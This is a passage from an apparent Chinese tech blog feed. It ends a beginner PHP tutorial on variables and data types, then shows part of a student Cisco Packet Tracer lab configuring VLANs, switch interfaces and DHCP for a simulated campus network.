class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">static</span> <span class="variable">$x</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="variable">$x</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x0303-PHP-echo-和-print-语句"><a href="#0x0303-PHP-echo-和-print-语句" class="headerlink" title="0x0303 PHP echo 和 print 语句"></a>0x0303 PHP echo 和 print 语句</h3><p>echo 和 print 区别:</p><ul><li>echo - 可以输出一个或多个字符串</li><li>print - 只允许输出一个字符串，返回值总为 1</li></ul><p><strong>提示：</strong>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</p><h2 id="0x04-PHP-数据类型"><a href="#0x04-PHP-数据类型" class="headerlink" title="0x04 PHP 数据类型"></a>0x04 PHP 数据类型</h2><p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）</p><p>一个<strong>字符串</strong>是一串字符的序列，就像 “Hello world!”。</p><p><strong>整数</strong>是一个没有小数的数字。</p><p>整数规则:</p><ul><li>整数必须至少有一个数字 (0-9)</li><li>整数不能包含逗号或空格</li><li>整数是没有小数点的</li><li>整数可以是正数或负数</li><li>整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。</li></ul><p><strong>浮点数</strong>是带小数部分的数字，或是指数形式。</p><p><strong>布尔型</strong>可以是 TRUE 或 FALSE。</p><p>$x&#x3D;true;<br>$y&#x3D;false;</p><p>布尔型通常用于条件判断。在接下来的章节中你会学到更多关于条件控制的教程。</p><p><strong>数组</strong>可以在一个变量中存储多个值。</p><p>在以下实例中创建了一个数组， 然后使用 PHP var_dump() 函数返回数组的数据类型和值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cars</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;Volvo&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;BMW&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;Toyota&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p><strong>对象</strong> 数据类型也可以用于存储数据。</p><p>在 PHP 中，对象必须声明。</p><p>首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$color</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Car</span>(<span class="params"><span class="variable">$color</span>=<span class="string">&quot;green&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;color = <span class="variable">$color</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">what_color</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;color;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>NULL 值</strong>表示变量没有值。NULL 是数据类型为 NULL 的值。</p><p>NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。</p><p>可以通过设置变量值为 NULL 来清空变量数据</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> php </tag>
            
            <tag> 超文本预处理器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络拓扑实验之校园网的构建2</title>
      <link href="/2021/03/12/58f62a0bb83e-q1jun/"/>
      <url>/2021/03/12/58f62a0bb83e-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="ecjtu-network-ExtraLab6"><a href="#ecjtu-network-ExtraLab6" class="headerlink" title="ecjtu-network-ExtraLab6"></a>ecjtu-network-ExtraLab6</h1><p>华东交通大学计算机网络 最终实验六：校园网</p><blockquote><p>实验指导书给出的拓扑图：<br><img src="https://user-images.githubusercontent.com/57565901/121632559-c5b71980-cab3-11eb-9dab-2f494ca044cb.jpg" alt="extra"></p></blockquote><h2 id="0x01-我们根据实验给出的拓扑图在Cisco-Packet-Tracer中把对应的设备选出并摆放好"><a href="#0x01-我们根据实验给出的拓扑图在Cisco-Packet-Tracer中把对应的设备选出并摆放好" class="headerlink" title="0x01 :我们根据实验给出的拓扑图在Cisco Packet Tracer中把对应的设备选出并摆放好:"></a>0x01 :我们根据实验给出的拓扑图在Cisco Packet Tracer中把对应的设备选出并摆放好:</h2><p>如下图：<br><img src="https://user-images.githubusercontent.com/57565901/121632932-78877780-cab4-11eb-8bc5-0fc253210e30.png" alt="image"></p><p>由于网络结构过于复杂，为了便于读者阅读，我把各区域的拓扑图分开截取：</p><h3 id="【教学区】"><a href="#【教学区】" class="headerlink" title="【教学区】"></a>【教学区】</h3><p><img src="https://user-images.githubusercontent.com/57565901/121639715-87bff280-cabf-11eb-9dad-f31e487cea05.png" alt="image"></p><h3 id="【宿舍区】"><a href="#【宿舍区】" class="headerlink" title="【宿舍区】"></a>【宿舍区】</h3><p><img src="https://user-images.githubusercontent.com/57565901/121639752-973f3b80-cabf-11eb-8702-685d4384e9d5.png" alt="image"></p><h3 id="【骨干网络区】"><a href="#【骨干网络区】" class="headerlink" title="【骨干网络区】"></a>【骨干网络区】</h3><p><img src="https://user-images.githubusercontent.com/57565901/121639824-af16bf80-cabf-11eb-9d5d-617fe34728ab.png" alt="image"></p><h3 id="【外网出口】"><a href="#【外网出口】" class="headerlink" title="【外网出口】"></a>【外网出口】</h3><p><img src="https://user-images.githubusercontent.com/57565901/121639841-b938be00-cabf-11eb-83e1-63684f34c743.png" alt="image"></p><h3 id="【DMZ数据机房区】"><a href="#【DMZ数据机房区】" class="headerlink" title="【DMZ数据机房区】"></a>【DMZ数据机房区】</h3><p><img src="https://user-images.githubusercontent.com/57565901/121639890-c786da00-cabf-11eb-8117-65ad5262362f.png" alt="image"></p><h2 id="0x02-配置接口和IP，设置网关："><a href="#0x02-配置接口和IP，设置网关：" class="headerlink" title="0x02:配置接口和IP，设置网关："></a>0x02:配置接口和IP，设置网关：</h2><p>PC1(静态IP主机以此类推,DHCP协议主机例外):</p><p><img src="https://user-images.githubusercontent.com/57565901/121633542-90133000-cab5-11eb-8d52-1065bc87f32a.png" alt="image"></p><h3 id="0x0201-各种二层路由器的配置："><a href="#0x0201-各种二层路由器的配置：" class="headerlink" title="0x0201: 各种二层路由器的配置："></a>0x0201: 各种二层路由器的配置：</h3><blockquote><p>配置交换机接口Vlan并打开接口<br>Switch 0:</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 500</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">Access VLAN does not exist. Creating vlan 500</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/1</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 500</span></span><br></pre></td></tr></table></figure><p>Switch 1:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 501</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">Access VLAN does not exist. Creating vlan 501</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/1</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 501</span></span><br></pre></td></tr></table></figure><p>Switch 2:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 502</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">Access VLAN does not exist. Creating vlan 502</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/1</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 502</span></span><br></pre></td></tr></table></figure><p>Switch 3:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 700</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">Access VLAN does not exist. Creating vlan 700</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/1</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 700</span></span><br></pre></td></tr></table></figure><p>Switch 4:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 701</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">Access VLAN does not exist. Creating vlan 701</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/1</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 701</span></span><br></pre></td></tr></table></figure><p>Switch 5:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 702</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">Access VLAN does not exist. Creating vlan 702</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/1</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 702</span></span><br></pre></td></tr></table></figure><p>因为Switch 6的配置和上面六个交换机的配置有所不同，<br>所以我决定把Switch 6的配置放在数据中心区配置里单独介绍。<br>下面是每个区域内设备的简单配置。<br>（暂时不配置路由策略，路由策略放到后面）</p><h3 id="0x0201-数据中心区"><a href="#0x0201-数据中心区" class="headerlink" title="0x0201: 数据中心区:"></a>0x0201: 数据中心区:</h3><p>Switch 6:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 101</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">Access VLAN does not exist. Creating vlan 101</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 102</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">Access VLAN does not exist. Creating vlan 102</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 103</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">Access VLAN does not exist. Creating vlan 103</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/4</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 104</span></span><br><span class="line"><span class="meta prompt_">% </span><span class="language-bash">Access VLAN does not exist. Creating vlan 104</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport mode trunk</span> </span><br></pre></td></tr></table></figure><p>Multilayer Switch 3:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int vlan 101</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 192.168.1.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 102</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 192.168.2.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 103</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 192.168.3.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 104</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 192.168.4.254 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/10</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport trunk encapsulation dot1q</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 101</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 102</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 103</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 104</span></span><br></pre></td></tr></table></figure><p>这里的目的是让各主机&#x2F;服务器能ping通这个三层交换机MS3：</p><p><img src="https://user-images.githubusercontent.com/57565901/121637122-842a6c80-cabb-11eb-96c1-5d18dbb5b79a.png" alt="image"></p><p>看来我们成功了！下面我们继续教学区(●’◡’●)</p><h3 id="0x0202-教学区"><a href="#0x0202-教学区" class="headerlink" title="0x0202: 教学区:"></a>0x0202: 教学区:</h3><p>Multilayer Switch 0:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 500</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 500</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 172.16.10.1 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 501</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 501</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 172.16.20.1 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 502</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 502</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 172.16.30.1 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br></pre></td></tr></table></figure><p>成功截图：</p><p><img src="https://user-images.githubusercontent.com/57565901/121637797-8b9e4580-cabc-11eb-9363-2b6b1945f9bb.png" alt="image"></p><h3 id="0x0203-学生宿舍区-DHCP动态分配IP"><a href="#0x0203-学生宿舍区-DHCP动态分配IP" class="headerlink" title="0x0203: 学生宿舍区(DHCP动态分配IP):"></a>0x0203: 学生宿舍区(DHCP动态分配IP):</h3><p>Multilayer Switch 4(以下简称MS4):</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int fa0/1</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 700</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 700</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 172.20.40.1 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 701</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 701</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 172.20.50.1 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int fa0/3</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 702</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 702</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 172.20.60.1 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br></pre></td></tr></table></figure><p>MS4配置DHCP服务:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip dhcp pool vlan700</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash">network 172.20.40.0 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash">defa</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash">default-router 172.20.40.1</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash">dns-server 0.0.0.0</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip dhcp pool vlan701</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash">network 172.20.50.0 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash">default-router 172.20.50.1</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash">dns-server 0.0.0.0</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash">ip dhcp pool vlan702</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash">network 172.20.60.0 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash">default-router 172.20.60.1</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash">dns-server 0.0.0.0</span></span><br><span class="line"><span class="meta prompt_">Switch(dhcp-config)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure><p>这几条指令的作用是让所配置的DHCP不分配以下几个IP，因为这几个IP作为网关配置在虚接口Vlan700、701、702中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip dhcp excluded-address 172.20.40.1</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip dhcp excluded-address 172.20.50.1</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip dhcp excluded-address 172.20.60.1</span></span><br></pre></td></tr></table></figure><p>注意这里我们要在PC中打开DHCP服务噢！</p><p><img src="https://user-images.githubusercontent.com/57565901/121639235-d02ae080-cabe-11eb-86f0-db743c54beb4.png" alt="image"><br>出现图上右下角的由DHCP服务分发的IP，说明DHCP服务配置完成！<br>下面我们测试一下主机PC与MS4的连通性：</p><p><img src="https://user-images.githubusercontent.com/57565901/121639330-f9e40780-cabe-11eb-82e7-f75abeba880b.png" alt="image"><br>成功！！！我们继续往下做。</p><h3 id="0x0204-骨干网络区"><a href="#0x0204-骨干网络区" class="headerlink" title="0x0204: 骨干网络区:"></a>0x0204: 骨干网络区:</h3><blockquote><p>为了便于读者阅读，我们将三层交换机<code>Multilayer Switch</code>缩写为<code>MS</code>。<br>MS0:</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int f0/24</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">switchport access vlan 321</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">int vlan 321</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip address 10.10.21.253 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span></span><br></pre></td></tr></table></figure><p>MS1:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span 